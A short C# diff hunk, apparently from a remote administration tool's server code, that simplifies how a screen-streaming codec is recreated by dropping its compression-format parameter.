@@ -257,14 +257,10 @@ namespace Pulsar.Server.Messages
                 if (!IsStarted)
                     return;
 
-                if (_codec == null
-                    || _codec.ImageQuality != message.Quality
-                    || _codec.Monitor != message.Monitor
-                    || _codec.Resolution != message.Resolution
-                    || _codec.CompressionFormat != message.ImageFormat)
+                if (_codec == null || _codec.ImageQuality != message.Quality || _codec.Monitor != message.Monitor || _codec.Resolution != message.Resolution)
                 {
                     _codec?.Dispose();
-                    _codec = new UnsafeStreamCodec(message.Quality, message.Monitor, message.Resolution, message.ImageFormat);
+                    _codec = new UnsafeStreamCodec(message.Quality, message.Monitor, message.Resolution);
                 }
 
                 if (message.Image != null)
